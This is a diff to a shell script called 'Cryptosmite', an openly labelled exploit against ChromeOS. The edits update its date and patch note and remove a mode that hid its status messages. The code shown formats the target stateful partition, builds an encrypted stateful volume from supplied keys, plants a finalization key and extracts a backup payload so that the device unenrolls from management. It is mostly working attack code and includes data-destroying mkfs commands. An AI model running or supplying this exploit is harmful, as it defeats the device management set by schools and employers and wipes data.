@@ -13,23 +13,13 @@ CRYPTSETUP_PATH=/usr/local/bin/cryptsetup_$(arch)
 mount -o rw /dev/sda1 /mnt/stateful_partition
 chmod +x /usr/local/bin/cryptsetup_aarch64
 chmod +x /usr/local/bin/cryptsetup_x86_64
-SCRIPT_DATE="[2024-01-28]"
+SCRIPT_DATE="[2024-04-18]"
 BACKUP_PAYLOAD=/mnt/stateful_partition/stateful.tar.xz
 NEW_ENCSTATEFUL_SIZE=$((1024 * 1024 * 1024)) # 1 GB
-
-[ -z "$SENSITIVE_MODE" ] && SENSITIVE_MODE=0
 
 fail() {
 	printf "%b\n" "$*" >&2
 	exit 1
-}
-
-echo_sensitive() {
-	if [ "$SENSITIVE_MODE" -eq 1 ]; then
-		echo "Doing something"
-	else
-		echo "$@"
-	fi
 }
 
 get_largest_cros_blockdev() {
@@ -85,16 +75,12 @@ CROS_DEV="$(get_largest_cros_blockdev)"
 TARGET_PART="$(format_part_number "$CROS_DEV" 1)"
 [ -b "$TARGET_PART" ] || fail "$TARGET_PART is not a block device!"
 
-trap 'echo $BASH_COMMAND failed with exit code $?.' ERR
-trap 'cleanup; exit' EXIT
-trap 'echo Abort.; cleanup; exit' INT
-
 clear
 echo "Welcome to Cryptosmite."
 echo "Script date: ${SCRIPT_DATE}"
 echo ""
 echo "This will destroy all data on ${TARGET_PART} and unenroll the device."
-echo "Note that this exploit is patched on some release of ChromeOS r120 and LTS r114."
+echo "Note that this exploit is patched in ChromeOS r120 and LTS r114."
 echo "Continue? (y/N)"
 read -r action
 case "$action" in
@@ -102,28 +88,32 @@ case "$action" in
 	*) fail "Abort." ;;
 esac
 
-echo_sensitive "Wiping and mounting stateful"
-mkfs.ext4 -F "$TARGET_PART" >/dev/null 2>&1
+trap 'echo $BASH_COMMAND failed with exit code $?.' ERR
+trap 'cleanup; exit' EXIT
+trap 'echo Abort.; cleanup; exit' INT
+
+echo "Wiping and mounting stateful"
+mkfs.ext4 -F -b 4096 -L H-STATE "$TARGET_PART" >/dev/null 2>&1
 STATEFUL_MNT=$(mktemp -d)
 mkdir -p "$STATEFUL_MNT"
 mount "$TARGET_PART" "$STATEFUL_MNT"
 
-echo_sensitive "Setting up encstateful"
+echo "Setting up encstateful"
 truncate -s "$NEW_ENCSTATEFUL_SIZE" "$STATEFUL_MNT"/encrypted.block
 ENCSTATEFUL_KEY=$(mktemp)
 key_ecryptfs > "$ENCSTATEFUL_KEY"
 ${CRYPTSETUP_PATH} open --type plain --cipher aes-cbc-essiv:sha256 --key-size 256 --key-file "$ENCSTATEFUL_KEY" "$STATEFUL_MNT"/encrypted.block encstateful
 
-echo_sensitive "Wiping and mounting encstateful"
-mkfs.ext4 -F /dev/mapper/encstateful >/dev/null 2>&1
+echo "Wiping and mounting encstateful"
+mkfs.ext4 -F -b 4096 /dev/mapper/encstateful >/dev/null 2>&1
 ENCSTATEFUL_MNT=$(mktemp -d)
 mkdir -p "$ENCSTATEFUL_MNT"
 mount /dev/mapper/encstateful "$ENCSTATEFUL_MNT"
 
-echo_sensitive "Dropping encstateful key"
+echo "Dropping encstateful key"
 key_crosencstateful > "$STATEFUL_MNT"/encrypted.needs-finalization
 
-echo_sensitive -n "Extracting backup to encstateful"
+echo -n "Extracting backup to encstateful"
 tar -xf "$BACKUP_PAYLOAD" -C "$ENCSTATEFUL_MNT" --checkpoint=.100
 echo ""
 
